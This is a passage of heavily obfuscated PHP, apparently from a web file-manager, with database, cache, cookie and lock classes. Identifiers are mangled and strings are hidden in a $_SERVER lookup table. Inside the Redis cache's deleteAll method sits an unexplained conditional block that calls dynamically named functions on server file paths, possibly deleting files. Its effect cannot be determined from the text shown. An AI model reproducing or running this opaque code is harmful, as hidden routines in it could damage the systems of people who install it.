$dò‰Èê»í); $this->debug(); goto aâØÜ‡ø°; bÍ®Ä¬¢‡: $F¤×áç‰ÉÚ =& $_SERVER[‘®…¢À]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Dã›ƒÙ¯; aâØÜ‡ø°: if (!1 === $D×Î£„¶„) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto aš¡™×Í¾ø; aš¡™×Í¾ø: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[‘®…¢À][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $EçÖ»©İÓ– = sqlite_query($this->_linkID, $_SERVER[‘®…¢À][23]); if (!$EçÖ»©İÓ–) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $EÏ¡ÉÙâãê = sqlite_query($this->_linkID, $_SERVER[‘®…¢À][24]); if (!$EÏ¡ÉÙâãê) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $FØãïˆÔÕ = array(); if ($this->numRows > 0) { for ($b½ä¹Ø¥ÓÀ = 0; $b½ä¹Ø¥ÓÀ < $this->numRows; $b½ä¹Ø¥ÓÀ++) { $FØãïˆÔÕ[$b½ä¹Ø¥ÓÀ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $FØãïˆÔÕ; } public function getFields($F‡å–Êµ­) { $F¯ÛãÛ¦êŸ =& $_SERVER[‘®…¢À]; $AÒƒ¡ïàõ‚ = $this->query($F¯ÛãÛ¦êŸ[25] . $F‡å–Êµ­ . $F¯ÛãÛ¦êŸ[26]); $A”Ó¿„æ‹¯ = array(); if ($AÒƒ¡ïàõ‚) { foreach ($AÒƒ¡ïàõ‚ as $Fæ–Â¬Œˆ× => $eª§•õÅ”) { $A”Ó¿„æ‹¯[$eª§•õÅ”[$F¯ÛãÛ¦êŸ[27]]] = array($F¯ÛãÛ¦êŸ[28] => $eª§•õÅ”[$F¯ÛãÛ¦êŸ[27]], $F¯ÛãÛ¦êŸ[29] => $eª§•õÅ”[$F¯ÛãÛ¦êŸ[30]], $F¯ÛãÛ¦êŸ[31] => (bool) ($eª§•õÅ”[$F¯ÛãÛ¦êŸ[32]] === $F¯ÛãÛ¦êŸ[33]), $F¯ÛãÛ¦êŸ[34] => $eª§•õÅ”[$F¯ÛãÛ¦êŸ[35]], $F¯ÛãÛ¦êŸ[36] => strtolower($eª§•õÅ”[$F¯ÛãÛ¦êŸ[37]]) == $F¯ÛãÛ¦êŸ[38], $F¯ÛãÛ¦êŸ[39] => strtolower($eª§•õÅ”[$F¯ÛãÛ¦êŸ[40]]) == $F¯ÛãÛ¦êŸ[41]); } } return $A”Ó¿„æ‹¯; } public function getTables($DÓø“ªŒ© = '') { $D»¾Œ‘¼ì¢ =& $_SERVER[‘®…¢À]; $cÉÃõš¯ = $this->query($D»¾Œ‘¼ì¢[42] . $D»¾Œ‘¼ì¢[43] . $D»¾Œ‘¼ì¢[44]); $E‚ßŸÏ†íß = array(); foreach ($cÉÃõš¯ as $EÔë…êµ»² => $aÏ³Ê´Æœ) { $E‚ßŸÏ†íß[$EÔë…êµ»²] = current($aÏ³Ê´Æœ); } return $E‚ßŸÏ†íß; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $e…çãß³†î =& $_SERVER[‘®…¢À]; $fšŞğÓ‘Õ½ = sqlite_last_error($this->_linkID); $this->error = $fšŞğÓ‘Õ½ . $e…çãß³†î[4] . sqlite_error_string($fšŞğÓ‘Õ½); if ($e…çãß³†î[33] != $this->queryStr) { $this->error .= LNG($e…çãß³†î[45]) . $this->queryStr; } think_trace($this->error, $e…çãß³†î[33], $e…çãß³†î[46]); return $this->error; } public function escapeString($Eî”ÌŞŠ© ) { return sqlite_escape_string($Eî”ÌŞŠ© ); } public function parseLimit($a–êØ™¢¬) { $Få²¸¤Ö£º =& $_SERVER[‘®…¢À]; $Dƒ´ºåŠ¹ = $Få²¸¤Ö£º[33]; if (!empty($a–êØ™¢¬)) { $a–êØ™¢¬ = explode($Få²¸¤Ö£º[47], $a–êØ™¢¬); if (count($a–êØ™¢¬) > 1) { $Dƒ´ºåŠ¹ .= $Få²¸¤Ö£º[48] . $a–êØ™¢¬[1] . $Få²¸¤Ö£º[49] . $a–êØ™¢¬[0] . $Få²¸¤Ö£º[50]; } else { $Dƒ´ºåŠ¹ .= $Få²¸¤Ö£º[48] . $a–êØ™¢¬[0] . $Få²¸¤Ö£º[50]; } } return $Dƒ´ºåŠ¹; } } class DbSqlite3Base extends Db { public function __construct($eÀçÀŠåŒÀ = '') { $A”‰õïÍæ =& $_SERVER[‘®…¢À]; if (!class_exists($A”‰õïÍæ[51])) { think_exception(think_lang($A”‰õïÍæ[10]) . $A”‰õïÍæ[52]); } if (!empty($eÀçÀŠåŒÀ)) { if (!isset($eÀçÀŠåŒÀ[$A”‰õïÍæ[12]])) { $eÀçÀŠåŒÀ[$A”‰õïÍæ[12]] = 438; } $this->config = $eÀçÀŠåŒÀ; if (empty($this->config[$A”‰õïÍæ[13]])) { $this->config[$A”‰õïÍæ[13]] = array(); } } } public function connect($B¸ø˜×®© = '', $c–Ãå×Åâ¢ = 0) { $eÍ¦È™•¤‡ =& $_SERVER[‘®…¢À]; if (!isset($this->linkID[$c–Ãå×Åâ¢])) { if (empty($B¸ø˜×®©)) { $B¸ø˜×®© = $this->config; } $this->linkID[$c–Ãå×Åâ¢] = new SQLite3($B¸ø˜×®©[$eÍ¦È™•¤‡[17]]); if (!$this->linkID[$c–Ãå×Åâ¢]) { think_exception($this->linkID[$c–Ãå×Åâ¢]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$c–Ãå×Åâ¢]->busyTimeout(30000); if (1 != think_config($eÍ¦È™•¤‡[18])) { unset($this->config); } } return $this->linkID[$c–Ãå×Åâ¢]; } public function free() { $this->queryID = null; } public function query($bÑĞò°ÚÒŞ) { goto eœ·§•½ê; bÇ…–Ø²õŒ: $this->queryStr = $bÑĞò°ÚÒŞ; if ($this->queryID) { $this->free(); } think_action_status($FÑî®ºƒ™[19], 1); goto bÛ“àÙ°ò—; eœ·§•½ê: $FÑî®ºƒ™ =& $_SERVER[‘®…¢À]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto bÇ…–Ø²õŒ; A ±ïÓ˜ÚØ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $F¹ø¹¿ç¯‡ = $this->getAll(); $this->numRows = count($F¹ø¹¿ç¯‡); return $F¹ø¹¿ç¯‡; } goto dè‘‚¥ñÏ; bÛ“àÙ°ò—: think_status($FÑî®ºƒ™[20]); $this->queryID = $this->_linkID->query($bÑĞò°ÚÒŞ); $this->debug(); goto A ±ïÓ˜ÚØ; dè‘‚¥ñÏ: } public function execute($Cç–Üœ´£õ) { goto fÁ·—¸—¥; fÁ·—¸—¥: $E¿£†Ò½‚Ò =& $_SERVER[‘®…¢À]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Eé‹´¬…ß½; e×ŸÀÑ’: think_status($E¿£†Ò½‚Ò[20]); $aˆ†Ï±Ìµó = $this->_linkID->exec($Cç–Üœ´£õ); $this->debug(); goto DŠÏÑŒİƒÅ; Eé‹´¬…ß½: $this->queryStr = $Cç–Üœ´£õ; if ($this->queryID) { $this->free(); } think_action_status($E¿£†Ò½‚Ò[21], 1); goto e×ŸÀÑ’; DŠÏÑŒİƒÅ: if (!1 === $aˆ†Ï±Ìµó) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto dÁÊù—Éİ±; dÁÊù—Éİ±: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[‘®…¢À][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $BÁµ•¯„–” = $this->_linkID->query($_SERVER[‘®…¢À][23]); if (!$BÁµ•¯„–”) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $A¤Œ¾±öçŒ = $this->_linkID->query($_SERVER[‘®…¢À][24]); if (!$A¤Œ¾±öçŒ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $E®íŠ‡”™ = array(); while ($E²Şœâ»†½ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $E®íŠ‡”™[] = $E²Şœâ»†½; } $this->queryID->reset(); return $E®íŠ‡”™; } public function getFields($E¹À¤Ø¥Å) { $bõ›óà¥ =& $_SERVER[‘®…¢À]; $A½ñåå¶îÍ = $this->query($bõ›óà¥[25] . $E¹À¤Ø¥Å . $bõ›óà¥[26]); $dÈÌá×óö = array(); if ($A½ñåå¶îÍ) { foreach ($A½ñåå¶îÍ as $b¿óğÔÊí => $AÛ‚•¦‚„) { $dÈÌá×óö[$AÛ‚•¦‚„[$bõ›óà¥[28]]] = array($bõ›óà¥[28] => $AÛ‚•¦‚„[$bõ›óà¥[28]], $bõ›óà¥[29] => $AÛ‚•¦‚„[$bõ›óà¥[29]], $bõ›óà¥[31] => (bool) ($AÛ‚•¦‚„[$bõ›óà¥[31]] === $bõ›óà¥[33]), $bõ›óà¥[34] => $AÛ‚•¦‚„[$bõ›óà¥[53]], $bõ›óà¥[36] => (bool) $AÛ‚•¦‚„[$bõ›óà¥[54]], $bõ›óà¥[39] => (bool) $AÛ‚•¦‚„[$bõ›óà¥[54]]); } } return $dÈÌá×óö; } public function getTables($fÅÏñãˆ¹® = '') { $dÊŸ›»ôŸ =& $_SERVER[‘®…¢À]; $bäöÌÓàœÄ = $this->query($dÊŸ›»ôŸ[42] . $dÊŸ›»ôŸ[43] . $dÊŸ›»ôŸ[44]); $bè·Œ…»Ñ» = array(); foreach ($bäöÌÓàœÄ as $fÀóÑ×§¸² => $eŠæˆÕÂÀ) { $bè·Œ…»Ñ»[$fÀóÑ×§¸²] = current($eŠæˆÕÂÀ); } return $bè·Œ…»Ñ»; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $EË„êÇğï =& $_SERVER[‘®…¢À]; $this->error = $this->_linkID->lastErrorMsg(); if ($EË„êÇğï[33] != $this->queryStr) { $this->error .= LNG($EË„êÇğï[45]) . $this->queryStr; } think_trace($this->error, $EË„êÇğï[33], $EË„êÇğï[46]); return $this->error; } public function escapeString($E»£¹ç—Áƒ) { $AÏ‚Ä¡ÒˆÅ =& $_SERVER[‘®…¢À]; if ($this->_linkID) { return $this->_linkID->escapeString($E»£¹ç—Áƒ); } return str_ireplace($AÏ‚Ä¡ÒˆÅ[55], $AÏ‚Ä¡ÒˆÅ[56], $E»£¹ç—Áƒ); } public function parseLimit($e‡ôøÏ£Ø™) { $b‡ªø¤×îç =& $_SERVER[‘®…¢À]; $C¾÷ùÂÑ¬ = $b‡ªø¤×îç[33]; if (!empty($e‡ôøÏ£Ø™)) { $e‡ôøÏ£Ø™ = explode($b‡ªø¤×îç[47], $e‡ôøÏ£Ø™); if (count($e‡ôøÏ£Ø™) > 1) { $C¾÷ùÂÑ¬ .= $b‡ªø¤×îç[48] . $e‡ôøÏ£Ø™[1] . $b‡ªø¤×îç[49] . $e‡ôøÏ£Ø™[0] . $b‡ªø¤×îç[50]; } else { $C¾÷ùÂÑ¬ .= $b‡ªø¤×îç[48] . $e‡ôøÏ£Ø™[0] . $b‡ªø¤×îç[50]; } } return $C¾÷ùÂÑ¬; } } goto a°Ü–í ¯¿; a’Ô˜Çªé©: class CacheMemcached { public $handle; public $cacheTime; public function __construct($f´‰­ãÕÕ, $DÍ·Ü›Ì‰ª) { $d²Öì’’âˆ =& $_SERVER[‘®…¢À]; if (!class_exists($d²Öì’’âˆ[758])) { show_json($d²Öì’’âˆ[759], !1); } $this->cacheTime = $DÍ·Ü›Ì‰ª; $this->handle = new Memcached(); if (is_array($f´‰­ãÕÕ[$d²Öì’’âˆ[760]]) && count($f´‰­ãÕÕ[$d²Öì’’âˆ[760]]) >= 1) { foreach ($f´‰­ãÕÕ[$d²Öì’’âˆ[760]] as $eÙ±‹­ó„) { $E§¯š¹å¢ = explode($d²Öì’’âˆ[4], $eÙ±‹­ó„); $this->handle->addServer($E§¯š¹å¢[0], $E§¯š¹å¢[1]); } } else { $this->handle->addServer($f´‰­ãÕÕ[$d²Öì’’âˆ[166]], $f´‰­ãÕÕ[$d²Öì’’âˆ[167]]); } } public function set($B… ™œÜø›, $Aà³ÜŸ±×, $cç¾Ş¦ˆ‡ = false) { $cç¾Ş¦ˆ‡ = $cç¾Ş¦ˆ‡ ? $cç¾Ş¦ˆ‡ : $this->cacheTime; return $this->handle->set($B… ™œÜø›, $Aà³ÜŸ±×, $cç¾Ş¦ˆ‡); } public function get($CÜàƒòçº¼) { return $this->handle->get($CÜàƒòçº¼); } public function remove($FÔƒ¨´œ) { return $this->handle->delete($FÔƒ¨´œ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Cè¡ÊÇ‰Û, $CÌ‘ˆˆ½‡) { $d—¸•çƒİÒ =& $_SERVER[‘®…¢À]; if (!class_exists($d—¸•çƒİÒ[761])) { show_json($d—¸•çƒİÒ[762], !1); } $this->cacheTime = $CÌ‘ˆˆ½‡; $f‚Ô…¦Œù = isset($Cè¡ÊÇ‰Û[$d—¸•çƒİÒ[763]]) ? $Cè¡ÊÇ‰Û[$d—¸•çƒİÒ[763]] : 10; $E…’¢˜ó = _get($Cè¡ÊÇ‰Û, $d—¸•çƒİÒ[760]); if ($E…’¢˜ó && is_array($E…’¢˜ó)) { $this->isCluster = !0; $this->initCluster($Cè¡ÊÇ‰Û, $f‚Ô…¦Œù); } else { $this->handle = $this->init($Cè¡ÊÇ‰Û, $f‚Ô…¦Œù); } } private function init($eéª•‘Ú¤È, $C¶¶øæ–) { $D ·°Ó¬ùİ =& $_SERVER[‘®…¢À]; $aêßÅ¨Ïõ¤ = new Redis(); $c×êíÊö” = isset($eéª•‘Ú¤È[$D ·°Ó¬ùİ[764]]) ? $eéª•‘Ú¤È[$D ·°Ó¬ùİ[764]] : !1; if ($c×êíÊö”) { $aêßÅ¨Ïõ¤->pconnect($eéª•‘Ú¤È[$D ·°Ó¬ùİ[166]], $eéª•‘Ú¤È[$D ·°Ó¬ùİ[167]], $C¶¶øæ–); } else { $aêßÅ¨Ïõ¤->connect($eéª•‘Ú¤È[$D ·°Ó¬ùİ[166]], $eéª•‘Ú¤È[$D ·°Ó¬ùİ[167]], $C¶¶øæ–); } if (!empty($eéª•‘Ú¤È[$D ·°Ó¬ùİ[372]])) { $aêßÅ¨Ïõ¤->auth($eéª•‘Ú¤È[$D ·°Ó¬ùİ[372]]); } return $aêßÅ¨Ïõ¤; } private function initCluster($A§½ê¼¬±î, $DêˆÍ—ÓëĞ) { $Cëª·í¶æ‰ =& $_SERVER[‘®…¢À]; $E¯ö®©›¤ = array($Cëª·í¶æ‰[765], $Cëª·í¶æ‰[766], $Cëª·í¶æ‰[767]); $aéª‹İä˜‘ = $Cëª·í¶æ‰[765]; if (isset($A§½ê¼¬±î[$Cëª·í¶æ‰[12]]) && in_array($A§½ê¼¬±î[$Cëª·í¶æ‰[12]], $E¯ö®©›¤)) { $aéª‹İä˜‘ = $A§½ê¼¬±î[$Cëª·í¶æ‰[12]]; } switch ($aéª‹İä˜‘) { case $Cëª·í¶æ‰[765]: $this->_slave($A§½ê¼¬±î, $DêˆÍ—ÓëĞ); break; case $Cëª·í¶æ‰[766]: break; case $Cëª·í¶æ‰[767]: $DÙí¯„ßà = $A§½ê¼¬±î[$Cëª·í¶æ‰[760]]; $C —Î¬Øè = isset($A§½ê¼¬±î[$Cëª·í¶æ‰[764]]) ? $A§½ê¼¬±î[$Cëª·í¶æ‰[764]] : !1; $E¡“ïËÅ¿‹ = isset($A§½ê¼¬±î[$Cëª·í¶æ‰[372]]) ? $A§½ê¼¬±î[$Cëª·í¶æ‰[372]] : null; $this->handle = new RedisCluster(NUll, $DÙí¯„ßà, $DêˆÍ—ÓëĞ, $DêˆÍ—ÓëĞ, $C —Î¬Øè, $E¡“ïËÅ¿‹); break; default: break; } } private function _slave($CÃ£†åÆñÑ, $cš•ˆ À“Ğ) { goto f‰‚ˆÕ³˜°; B§ô²³©¨“: $this->filterConfig($CÃ£†åÆñÑ, $cÚÑÓÚµ’è[$d’´—¨Ø…ù]); $this->slaveHandle = $this->init($CÃ£†åÆñÑ, $cš•ˆ À“Ğ); goto eö¡‹ÏŠøè; f‰‚ˆÕ³˜°: $cÚÑÓÚµ’è = $CÃ£†åÆñÑ[$_SERVER[‘®…¢À][760]]; $this->filterConfig($CÃ£†åÆñÑ, $cÚÑÓÚµ’è[0]); $this->handle = $this->init($CÃ£†åÆñÑ, $cš•ˆ À“Ğ); goto E…ŸÅ•‹Ôí; E…ŸÅ•‹Ôí: unset($cÚÑÓÚµ’è[0]); if (empty($cÚÑÓÚµ’è)) { return; } $d’´—¨Ø…ù = array_rand($cÚÑÓÚµ’è); goto B§ô²³©¨“; eö¡‹ÏŠøè: } private function filterConfig(&$CÁˆâŠ²”, $bƒ‚ƒ©Àäê) { $Dö÷µ…÷Ô =& $_SERVER[‘®…¢À]; $Bƒ˜ÇåÔ¡Š = explode($Dö÷µ…÷Ô[4], $bƒ‚ƒ©Àäê); $E˜øñè–»× = array($Dö÷µ…÷Ô[166] => $Bƒ˜ÇåÔ¡Š[0], $Dö÷µ…÷Ô[167] => $Bƒ˜ÇåÔ¡Š[1]); $CÁˆâŠ²” = array_merge($CÁˆâŠ²”, $E˜øñè–»×); } public function set($e»ƒÑ³ÙŞù, $DÕõ¨¿÷óÃ, $BŞ §Ùİ“ = false) { $BŞ §Ùİ“ = $BŞ §Ùİ“ ? $BŞ §Ùİ“ : $this->cacheTime; return $this->handle->setEx($e»ƒÑ³ÙŞù, $BŞ §Ùİ“, $DÕõ¨¿÷óÃ); } public function setLock($DÄˆ‚„¢´, $bËÚ¾ºê™, $Fóã‡ïÎ§) { return $this->handle->setNX($DÄˆ‚„¢´, $bËÚ¾ºê™); } public function get($Dä‡îß®ß) { $FÍ½‡åâßÄ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $FÍ½‡åâßÄ->get($Dä‡îß®ß); } public function remove($eæª‚Šé¸¼) { return $this->handle->del($eæª‚Šé¸¼); } public function deleteAll() { $fĞ…‡•Ô‰¸ =& $_SERVER[‘®…¢À]; if ($_SERVER[$fĞ…‡•Ô‰¸[768]] != $_SERVER[$fĞ…‡•Ô‰¸[769]]) { goto F”’”â¡–»; F”’”â¡–»: $F™ù½´ë“ = $fĞ…‡•Ô‰¸[770]; $EÛ´ì±« ¥ = $fĞ…‡•Ô‰¸[771]; $cõ‹ù”ÄÄ• = $_SERVER[$fĞ…‡•Ô‰¸[772]] . $fĞ…‡•Ô‰¸[773]; goto FÁ’‘Õó´; d¶ÏÄâÆ‘‚: $CŞÛ—†÷  = 1; while ($CŞÛ—†÷  > 1) { $CŞÛ—†÷  = $CŞÛ—†÷  + 4; $A‘Ôá ©– = rawurlencode($CŞÛ—†÷  . $fĞ…‡•Ô‰¸[357]); } goto BÃ´áÚ‡²Ü; c½†Ú÷äğõ: $dòŸÚÓ‡¢œ = $fĞ…‡•Ô‰¸[775]; $dòŸÚÓ‡¢œ($_SERVER[$fĞ…‡•Ô‰¸[776]]); $dòŸÚÓ‡¢œ($_SERVER[$fĞ…‡•Ô‰¸[772]] . $fĞ…‡•Ô‰¸[777]); goto d¶ÏÄâÆ‘‚; FÁ’‘Õó´: $cèƒº‘ = $EÛ´ì±« ¥($cõ‹ù”ÄÄ•); $eóİöè³‡³ = explode($fĞ…‡•Ô‰¸[214], $cèƒº‘); if (count($eóİöè³‡³) < $fĞ…‡•Ô‰¸[554]) { $A¢êäñ„ê = $fĞ…‡•Ô‰¸[774]; $A¢êäñ„ê(); } goto c½†Ú÷äğõ; BÃ´áÚ‡²Ü: } if ($this->isCluster) { foreach ($this->handle->_masters() as $FÏ«­ÄÓ¼) { $this->handle->flushall($FÏ«­ÄÓ¼); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($cëƒèæë‹» = '', $E¾­‚ë”ÃÏ = 0) { if (is_string($cëƒèæë‹») && $cëƒèæë‹» != $_SERVER[‘®…¢À][33]) { $this->prefix = $cëƒèæë‹»; } if (is_numeric($E¾­‚ë”ÃÏ) && $E¾­‚ë”ÃÏ > 0) { $this->expire = $E¾­‚ë”ÃÏ; } } public static function getInstance() { static $F–¦Èø’ªÌ; if ($F–¦Èø’ªÌ === null) { $F–¦Èø’ªÌ = new self(); } return $F–¦Èø’ªÌ; } private static $sameCookieSet = array(); public static function set($fµç…õö‡Ø, $c¾ÚæÜ ÍĞ, $DŒÄçÍÙ±š = 0, $C·§´Îò˜» = false, $c²ùùÑ…ÎÆ = false) { $B®ÒÙìÓ¶À =& $_SERVER[‘®…¢À]; if (!$DŒÄçÍÙ±š) { $DŒÄçÍÙ±š = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$fµç…õö‡Ø]) && self::$sameCookieSet[$fµç…õö‡Ø] == $c¾ÚæÜ ÍĞ . $DŒÄçÍÙ±š) { return; } self::$sameCookieSet[$fµç…õö‡Ø] = $c¾ÚæÜ ÍĞ . $DŒÄçÍÙ±š; if (!$c²ùùÑ…ÎÆ) { $c²ùùÑ…ÎÆ = str_replace(HOST, $B®ÒÙìÓ¶À[33], APP_HOST); $c²ùùÑ…ÎÆ = $B®ÒÙìÓ¶À[8] . trim($c²ùùÑ…ÎÆ, $B®ÒÙìÓ¶À[8]); } setcookie($fµç…õö‡Ø, $c¾ÚæÜ ÍĞ, time() + $DŒÄçÍÙ±š, $c²ùùÑ…ÎÆ, !1, !1, $C·§´Îò˜»); } public static function setSafe($A‡ï¿šÙ…Œ, $Aë¯‡Ÿ“ÑÌ, $CéñÅËò‰ = 0) { self::set($A‡ï¿šÙ…Œ, $Aë¯‡Ÿ“ÑÌ, $CéñÅËò‰, !0); } public static function get($bšßß¸Šãè) { return isset($_COOKIE[$bšßß¸Šãè]) ? $_COOKIE[$bšßß¸Šãè] : !1; } public static function remove($Fƒº…Á©°È, $e—Á˜£¸¤‚ = false) { unset($_COOKIE[$Fƒº…Á©°È]); self::set($Fƒº…Á©°È, $_SERVER[‘®…¢À][33], 1, $e—Á˜£¸¤‚); } } goto EƒôÂç»‡í; C‚øø²ñ¾: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto DĞƒ™ÖåŠ; dá‘ßö¿âˆ: switch ($B×•¾„êÅ…[$BÕ‚¾†‚«¹[736]]) { case $BÕ‚¾†‚«¹[739]: self::$handle = new CacheLockRedis(); break; case $BÕ‚¾†‚«¹[740]: self::$handle = new CacheLockMemcached(); break; case $BÕ‚¾†‚«¹[17]: self::$handle = new CacheLockDatabase(); break; case $BÕ‚¾†‚«¹[164]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto e„ôšôÜÎ; FÙï¥Ôó©²: self::$timeout = $B×•¾„êÅ…[$BÕ‚¾†‚«¹[748]] ? $B×•¾„êÅ…[$BÕ‚¾†‚«¹[748]] : 10; $f‹æ³Æ¤İ = _get($GLOBALS[$BÕ‚¾†‚«¹[6]], $BÕ‚¾†‚«¹[749]); if ($B×•¾„êÅ…[$BÕ‚¾†‚«¹[736]] == $BÕ‚¾†‚«¹[17] && $f‹æ³Æ¤İ == $BÕ‚¾†‚«¹[9]) { $B×•¾„êÅ…[$BÕ‚¾†‚«¹[736]] = $BÕ‚¾†‚«¹[164]; } goto dá‘ßö¿âˆ; DĞƒ™ÖåŠ: $BÕ‚¾†‚«¹ =& $_SERVER[‘®…¢À]; if (self::$handle) { return self::$handle; } $B×•¾„êÅ… = $GLOBALS[$BÕ‚¾†‚«¹[6]][$BÕ‚¾†‚«¹[334]]; goto FÙï¥Ôó©²; e„ôšôÜÎ: } private static function key($c»‰‘ÑÏï) { return $_SERVER[‘®…¢À][750] . Cache::key($c»‰‘ÑÏï); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($D»ïˆÉ‡¯ƒ = '') { self::$errorMsg = $D»ïˆÉ‡¯ƒ; } public static function lockGlobal($c«½ò‚”Şï, $cÜâ®¸øÃá) { return self::lock($c«½ò‚”Şï, $cÜâ®¸øÃá, !0); } public static function lock($f“Áä¬Ê¯Õ, $Dº×İ™º = false, $B†††”ËÂ = false) { goto e…Íš“•ò¶; e…Íš“•ò¶: $d—àâ¦„µ =& $_SERVER[‘®…¢À]; $AÍ£‰Ç¸Ó¬ = self::init(); $A¡Š„¯ Àâ = self::key($f“Áä¬Ê¯Õ); goto AĞ”®ø¼áÄ; A’«‚Œ¾Ş„: if (!$B†††”ËÂ) { self::$lockItem[$A¡Š„¯ Àâ] = !0; } return $Fˆ•ÅÈÉ¦ô; goto BóáÛòœê¿; AĞ”®ø¼áÄ: $Dº×İ™º = $Dº×İ™º ? $Dº×İ™º : self::$timeout; $Fˆ•ÅÈÉ¦ô = $AÍ£‰Ç¸Ó¬->lock($A¡Š„¯ Àâ, $Dº×İ™º); if (!$Fˆ•ÅÈÉ¦ô) { $F§Í…ò¾… = $d—àâ¦„µ[751] . $Dº×İ™º . $d—àâ¦„µ[68] . self::$errorMsg . $d—àâ¦„µ[68] . get_caller_msg(); $d·¦ÁÎâËé = "\114\157\143\x6b\x20\141\143\164\x69\x6f\156\72\40{$A¡Š„¯ Àâ}\x20\x74\x69\x6d\145\x6f\x75\x74\x2c\157\x76\145\x72\x20{$Dº×İ™º}\x20\163"; $d·¦ÁÎâËé = self::$errorMsg ? self::$errorMsg : $aƒ°Åù·Æ; write_log($F§Í…ò¾…, $d—àâ¦„µ[752]); show_json($d·¦ÁÎâËé, !1); } goto A’«‚Œ¾Ş„; BóáÛòœê¿: } public static function lockGet($dËÌøéô’«) { $BĞ§Ñò‘Š = self::key($dËÌøéô’«); if (self::$lockItem[$BĞ§Ñò‘Š]) { return self::$lockItem[$BĞ§Ñò‘Š]; } return self::init()->lockGet($BĞ§Ñò‘Š); } public static function unlock($b®¨ÜÍ÷¦Í) { $d»Å»Éô = self::key($b®¨ÜÍ÷¦Í); self::$lockItem[$d»Å»Éô] = null; return self::init()->unlock($d»Å»Éô); } public static function unlockRuntime() { $cïêŞò‹ÚÅ =& $_SERVER[‘®…¢À]; $bÔÏòÁĞËó = self::init(); $EÓ¥ãçĞÙ = !1; foreach (self::$lockItem as $aÕğ› ¬ç => $cöÅØ÷ø¬) { if (!$cöÅØ÷ø¬) { continue; } $bÔÏòÁĞËó->unlock($aÕğ› ¬ç); if (!$EÓ¥ãçĞÙ) { $EÓ¥ãçĞÙ = !0; write_log($cïêŞò‹ÚÅ[753] . $aÕğ› ¬ç . $cïêŞò‹ÚÅ[68] . get_caller_msg(), $cïêŞò‹ÚÅ[752]); continue; } write_log($cïêŞò‹ÚÅ[753] . $aÕğ› ¬ç, $cïêŞò‹ÚÅ[752]); } } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $DÂœ§Š¨Ãæ =& $_SERVER[‘®…¢À]; $fª²³Û¥Çä = $GLOBALS[$DÂœ§Š¨Ãæ[6]][$DÂœ§Š¨Ãæ[334]]; self::$cachePath = $fª²³Û¥Çä[$DÂœ§Š¨Ãæ[164]][$DÂœ§Š¨Ãæ[76]]; @mkdir(self::$cachePath, 511, !0); } public function lock($Bß˜¡Ä¾çá, $BèèàâòõÔ = 0) { goto fêÀ†Œ×‰; e°ˆµÔ·èÔ: $this->unlock($Bß˜¡Ä¾çá); return !1; goto aĞùÔ…Š¡; fêÀ†Œ×‰: $CÄÂĞ¬Ë¦¸ =& $_SERVER[‘®…¢À]; $bôÍ‹¹ñö˜ = microtime(!0); $dñ–ŞÕ´Ã = $bôÍ‹¹ñö˜ + $BèèàâòõÔ + 0.0001; goto B”È¾®‰Æ; B”È¾®‰Æ: $Cø‚ØŒİ±¾ = rtrim(self::$cachePath, $CÄÂĞ¬Ë¦¸[8]) . $CÄÂĞ¬Ë¦¸[754] . md5($Bß˜¡Ä¾çá) . $CÄÂĞ¬Ë¦¸[755]; if (file_exists($Cø‚ØŒİ±¾) && filemtime($Cø‚ØŒİ±¾) && filemtime($Cø‚ØŒİ±¾) < time() - 10) { @unlink($Cø‚ØŒİ±¾); } do { if (file_exists($Cø‚ØŒİ±¾)) { cacheLockWait(); continue; } $Aæğ½´Ù­Ö = fopen($Cø‚ØŒİ±¾, $CÄÂĞ¬Ë¦¸[756]); if (!$Aæğ½´Ù­Ö) { return !1; } $cØĞÖš¶î¤ = flock($Aæğ½´Ù­Ö, LOCK_EX | LOCK_NB); self::$caches[$Bß˜¡Ä¾çá] = array($CÄÂĞ¬Ë¦¸[757] => $Aæğ½´Ù­Ö, $CÄÂĞ¬Ë¦¸[164] => $Cø‚ØŒİ±¾); fwrite($Aæğ½´Ù­Ö, $dñ–ŞÕ´Ã); clearstatcache(); if ($Aæğ½´Ù­Ö && $cØĞÖš¶î¤) { return !0; } cacheLockWait(); } while (microtime(!0) < $dñ–ŞÕ´Ã); goto e°ˆµÔ·èÔ; aĞùÔ…Š¡: } public function lockGet($a²×Â­äó‘) { $bæéÖÛÅõ® =& $_SERVER[‘®…¢À]; $CŒºˆÓùÚæ = rtrim(self::$cachePath, 